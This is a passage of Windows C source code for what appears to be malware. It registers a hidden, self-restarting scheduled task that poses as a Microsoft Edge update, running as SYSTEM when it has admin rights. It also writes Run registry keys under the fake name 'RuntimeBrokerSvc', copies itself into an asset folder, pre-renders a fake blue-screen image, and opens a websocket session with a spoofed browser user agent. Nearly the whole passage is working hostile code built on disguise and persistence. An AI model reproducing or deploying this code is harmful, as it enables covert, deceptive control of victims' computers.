    IRegisteredTask   *rt  =NULL;
    IPrincipal        *prin=NULL;

    if (FAILED(CoCreateInstance(&CLSID_TaskScheduler,NULL,
            CLSCTX_INPROC_SERVER,&IID_ITaskService,(void**)&svc))) return;
    VARIANT v; VariantInit(&v);
    if (FAILED(ITaskService_Connect(svc,v,v,v,v))) goto out;
    if (FAILED(ITaskService_GetFolder(svc,L"\\",&root))) goto out;
    if (FAILED(ITaskService_NewTask(svc,0,&def))) goto out;

    ITaskDefinition_get_RegistrationInfo(def,&ri);
    if (ri) {
        IRegistrationInfo_put_Author(ri,L"Microsoft Corporation");
        IRegistrationInfo_put_Description(ri,
            L"Keeps the Microsoft Edge Update Task running.");
        IRegistrationInfo_Release(ri);
    }
    ITaskDefinition_get_Principal(def,&prin);
    if (prin) {
        if (as_system) {
            IPrincipal_put_UserId(prin,L"S-1-5-18");
            IPrincipal_put_LogonType(prin,TASK_LOGON_SERVICE_ACCOUNT);
            IPrincipal_put_RunLevel(prin,TASK_RUNLEVEL_HIGHEST);
        } else {
            IPrincipal_put_LogonType(prin,TASK_LOGON_INTERACTIVE_TOKEN);
            IPrincipal_put_RunLevel(prin,TASK_RUNLEVEL_LUA);
        }
        IPrincipal_Release(prin);
    }
    ITaskDefinition_get_Settings(def,&ts);
    if (ts) {
        ITaskSettings_put_Hidden(ts,VARIANT_TRUE);
        ITaskSettings_put_MultipleInstances(ts,TASK_INSTANCES_IGNORE_NEW);
        ITaskSettings_put_DisallowStartIfOnBatteries(ts,VARIANT_FALSE);
        ITaskSettings_put_StopIfGoingOnBatteries(ts,VARIANT_FALSE);
        ITaskSettings_put_ExecutionTimeLimit(ts,L"PT0S");
        ITaskSettings_put_RestartCount(ts,999);
        ITaskSettings_put_RestartInterval(ts,L"PT1M");
        ITaskSettings_Release(ts);
    }
    ITaskDefinition_get_Triggers(def,&tc);
    if (tc) {
        ITriggerCollection_Create(tc,TASK_TRIGGER_LOGON,&tr);
        if (tr) ITrigger_Release(tr);
        ITriggerCollection_Release(tc);
    }
    ITaskDefinition_get_Actions(def,&ac);
    if (ac) {
        IActionCollection_Create(ac,TASK_ACTION_EXEC,&act);
        if (act) {
            IAction_QueryInterface(act,&IID_IExecAction,(void**)&ea);
            if (ea) {
                IExecAction_put_Path(ea,(BSTR)exe);
                IExecAction_put_WorkingDirectory(ea,ASSET_DIR);
                IExecAction_Release(ea);
            }
            IAction_Release(act);
        }
        IActionCollection_Release(ac);
    }
    {
        VARIANT u,pw; VariantInit(&u); VariantInit(&pw);
        TASK_LOGON_TYPE lt=as_system
            ?TASK_LOGON_SERVICE_ACCOUNT:TASK_LOGON_INTERACTIVE_TOKEN;
        ITaskFolder_RegisterTaskDefinition(root,
            TASK_NAME,def,TASK_CREATE_OR_UPDATE,u,pw,lt,u,&rt);
        if (rt) IRegisteredTask_Release(rt);
    }
out:
    if (def)  ITaskDefinition_Release(def);
    if (root) ITaskFolder_Release(root);
    if (svc)  ITaskService_Release(svc);
}

/* ── Registry Run ───────────────────────────────────────────────────────── */
static void install_reg(const WCHAR *exe) {
    WCHAR val[MAX_PATH+4];
    swprintf_s(val,MAX_PATH+4,L"\"%s\"",exe);
    DWORD sz=(DWORD)((wcslen(val)+1)*sizeof(WCHAR));
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,KEY_SET_VALUE,&k)==ERROR_SUCCESS) {
        RegSetValueExW(k,L"RuntimeBrokerSvc",0,REG_SZ,(const BYTE*)val,sz);
        RegCloseKey(k);
    }
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,KEY_SET_VALUE,&k)==ERROR_SUCCESS) {
        RegSetValueExW(k,L"RuntimeBrokerSvc",0,REG_SZ,(const BYTE*)val,sz);
        RegCloseKey(k);
    }
}

/* ── WinMain ────────────────────────────────────────────────────────────── */
int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR cmd,int nShow) {
    (void)hPrev;(void)cmd;(void)nShow;

    HANDLE mutex=CreateMutexW(NULL,TRUE,
        L"Global\\MicrosoftEdgeCoreUpdateInstance_v2");
    if (GetLastError()==ERROR_ALREADY_EXISTS) return 0;

    WCHAR exe[MAX_PATH],dst[MAX_PATH];
    GetModuleFileNameW(NULL,exe,MAX_PATH);
    swprintf_s(dst,MAX_PATH,L"%s%s",ASSET_DIR,EXE_NAME);

    if (_wcsicmp(exe,dst)!=0) {
        CreateDirectoryW(ASSET_DIR,NULL);
        CopyFileW(exe,dst,FALSE);
    }

    BOOL admin=is_admin();
    CoInitializeEx(NULL,COINIT_APARTMENTTHREADED);
    install_reg(dst);
    install_task(dst,admin);

    if (!gdiplus_init()) { CoUninitialize(); return 1; }
    bsod_prerender();

    MFStartup(MF_VERSION,MFSTARTUP_NOSOCKET);

    g_ws_session=WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,WINHTTP_NO_PROXY_BYPASS,0);

    WNDCLASSEXW wc={0};
    wc.cbSize=sizeof wc; wc.hInstance=hInst;
    wc.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);

    wc.lpfnWndProc=evr_wndproc;
    wc.lpszClassName=L"DM_EVRHost";
    RegisterClassExW(&wc);
    g_evr_hwnd=CreateWindowExW(WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
        L"DM_EVRHost",L"",WS_POPUP,0,0,1,1,NULL,NULL,hInst,NULL);

    wc.lpfnWndProc=wndproc;
    wc.lpszClassName=L"CoreRtBrokerHost";
    RegisterClassExW(&wc);
    g_hwnd=CreateWindowExW(WS_EX_TOOLWINDOW|WS_EX_NOACTIVATE,
        L"CoreRtBrokerHost",L"",WS_POPUP,
        0,0,1,1,NULL,NULL,hInst,NULL);

    CreateThread(NULL,0,ws_thread,NULL,0,NULL);
    SetTimer(g_hwnd,99,TOPMOST_MS,NULL);

    MSG msg;
    while (GetMessageW(&msg,NULL,0,0)>0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    g_running=FALSE;
    do_clear();
    MFShutdown();
    ws_cleanup();
    if (g_ws_session) WinHttpCloseHandle(g_ws_session);
    if (g_bsod_bmp)   DeleteObject(g_bsod_bmp);
    gp_Shutdown(gp_token);
    CoUninitialize();
    CloseHandle(mutex);
    return 0;
}
